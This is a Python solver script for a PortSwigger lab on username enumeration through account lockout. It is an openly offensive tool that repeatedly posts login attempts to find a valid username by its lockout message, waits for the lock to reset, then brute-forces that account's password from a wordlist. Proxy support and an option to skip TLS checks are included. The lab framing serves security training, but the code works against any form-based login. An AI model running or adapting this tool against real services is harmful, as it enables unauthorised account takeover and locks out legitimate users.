#!/usr/bin/env python3
"""
Username enumeration via account lock (PortSwigger lab solver).

Lab logic:
  - 3 failed logins lock an account; further attempts against that account return
    "You have made too many incorrect login attempts" while unknown usernames
    keep returning the normal "Invalid username or password".
  - So hammer each candidate username several times in a row (Burp calls this a
    cluster bomb with Null payloads). The username whose responses contain the
    lock message is the valid one.
  - Wait for the lock to reset, then brute-force that user's password. A
    response without any error message (or a 302) is the correct password.

No hardcoded usernames, passwords or error strings — all come from files/flags.

Usage:
  python3 Username-enumeration-via-account-lock.py \
      --url https://<id>.web-security-academy.net/login \
      --cookie "session=..." \
      --usernames usernames.txt --passwords passwords.txt

  ... --repeats 5          # attempts per username (default 5)
  ... --wait 65            # seconds to wait for the lock to reset (default 65)
  ... --verbose
  ... --csv attempts.csv
  ... --proxy http://127.0.0.1:8080
"""
from __future__ import annotations

import argparse
import csv
import re
import sys
import time
from pathlib import Path
from urllib.parse import urlparse

try:
    import requests
    from requests import RequestException
except ImportError:
    print('error: pip3 install requests', file=sys.stderr)
    sys.exit(2)


def load_list(path: Path) -> list[str]:
    out, seen = [], set()
    for line in path.read_text(encoding='utf-8', errors='replace').splitlines():
        s = line.strip()
        if s and s not in seen:
            seen.add(s)
            out.append(s)
    return out


def norm(t: str) -> str:
    return re.sub(r'\s+', ' ', t or '').strip().lower()


def main() -> int:
    ap = argparse.ArgumentParser(
        description='Username enumeration via account lock.')
    ap.add_argument('--url', required=True)
    ap.add_argument('--cookie', default='')
    ap.add_argument('--usernames', default='usernames.txt')
    ap.add_argument('--passwords', default='passwords.txt')
    ap.add_argument('--user-field', default='username')
    ap.add_argument('--pass-field', default='password')
    ap.add_argument('--fixed-password', default='example',
                    help='password used while hammering usernames (default: example)')
    ap.add_argument('--repeats', type=int, default=5,
                    help='attempts per username (default 5)')
    ap.add_argument('--wait', type=float, default=65.0,
                    help='seconds to wait for the lock to reset (default 65)')
    ap.add_argument('--lock-regex', default=r'too many incorrect login attempts',
                    help='regex marking a locked account')
    ap.add_argument('--invalid-regex', default=r'invalid username or password',
                    help='regex marking a normal failed login')
    ap.add_argument('--user-agent', default='Mozilla/5.0 (AccountLock)')
    ap.add_argument('--proxy', default='')
    ap.add_argument('--delay', type=float, default=0.0)
    ap.add_argument('--timeout', type=float, default=20.0)
    ap.add_argument('--insecure', action='store_true')
    ap.add_argument('--all', action='store_true',
                    help='do not stop at the first valid username')
    ap.add_argument('--verbose', action='store_true')
    ap.add_argument('--csv', default='')
    args = ap.parse_args()

    usernames = load_list(Path(args.usernames))
    passwords = load_list(Path(args.passwords))
    if not usernames or not passwords:
        print('error: username/password wordlist is empty', file=sys.stderr)
        return 2

    s = requests.Session()
    s.headers.update({
        'User-Agent': args.user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
    })
    if args.cookie:
        s.headers['Cookie'] = args.cookie

    p = urlparse(args.url)
    vhost = f'{p.scheme}://{p.netloc}'
    s.headers['Origin'] = vhost
    s.headers['Referer'] = vhost + '/login'

    proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
    verify = not args.insecure
    lock_re = re.compile(args.lock_regex, re.I)
    invalid_re = re.compile(args.invalid_regex, re.I)

    rows: list[tuple[str, str, str, int, str]] = []

    def post(user: str, pwd: str):
        try:
            r = s.post(args.url,
                       data={args.user_field: user, args.pass_field: pwd},
                       timeout=args.timeout, allow_redirects=False,
                       proxies=proxies, verify=verify)
        except RequestException as e:
            print(f'[!] request error ({user}) -> {e}', file=sys.stderr)
            time.sleep(1)
            return None
        if args.delay:
            time.sleep(args.delay)
        return r

    # ---------- PHASE 1: find the lockable (valid) username ----------
    print(f'[*] PHASE 1: {len(usernames)} usernames x {args.repeats} attempts '
          f'(fixed pw="{args.fixed_password}")', file=sys.stderr)
    valid: list[str] = []
    for i, u in enumerate(usernames, 1):
        locked = False
        for _ in range(args.repeats):
            r = post(u, args.fixed_password)
            if r is None:
                continue
            body = r.text or ''
            rows.append(('user', u, args.fixed_password, r.status_code,
                         'lock' if lock_re.search(norm(body)) else ''))
            if lock_re.search(norm(body)):
                locked = True
                break
        if locked:
            print(f'[+] LOCKED (valid username): {u}', file=sys.stderr)
            valid.append(u)
            if not args.all:
                break
        elif i % 10 == 0:
            print(f'[*] {i}/{len(usernames)}', file=sys.stderr)

    if not valid:
        print('[-] no lockable username found', file=sys.stderr)
        if args.csv:
            with open(args.csv, 'w', newline='', encoding='utf-8') as f:
                w = csv.writer(f)
                w.writerow(('phase', 'user', 'pass', 'status', 'note'))
                w.writerows(rows)
        return 1

    # ---------- wait for the lock to reset ----------
    print(f'[*] waiting {args.wait:.0f}s for the account lock to reset',
          file=sys.stderr)
    time.sleep(args.wait)

    # ---------- PHASE 2: crack the password ----------
    print(f'[*] PHASE 2: {len(passwords)} passwords for {valid}', file=sys.stderr)
    hits: list[tuple[str, str, int]] = []
    for u in valid:
        for pw in passwords:
            r = post(u, pw)
            if r is None:
                continue
            body = r.text or ''
            status = r.status_code
            rows.append(('pass', u, pw, status,
                         'lock' if lock_re.search(norm(body)) else ''))
            n = norm(body)
            if status in (301, 302, 303, 307, 308):
                print(f'[+] HIT {u}:{pw} status={status}', file=sys.stderr)
                hits.append((u, pw, status))
                break
            if not invalid_re.search(n) and not lock_re.search(n):
                print(f'[+] HIT {u}:{pw} status={status} (no error message)',
                      file=sys.stderr)
                hits.append((u, pw, status))
                break

    if args.csv:
        with open(args.csv, 'w', newline='', encoding='utf-8') as f:
            w = csv.writer(f)
            w.writerow(('phase', 'user', 'pass', 'status', 'note'))
            w.writerows(rows)
        print(f'[*] CSV: {args.csv}', file=sys.stderr)

    if hits:
        for u, pw, st in hits:
            print(f'HIT {u}:{pw} ({st})')
        return 0
    print('[-] password not found', file=sys.stderr)
    return 1


if __name__ == '__main__':
    sys.exit(main())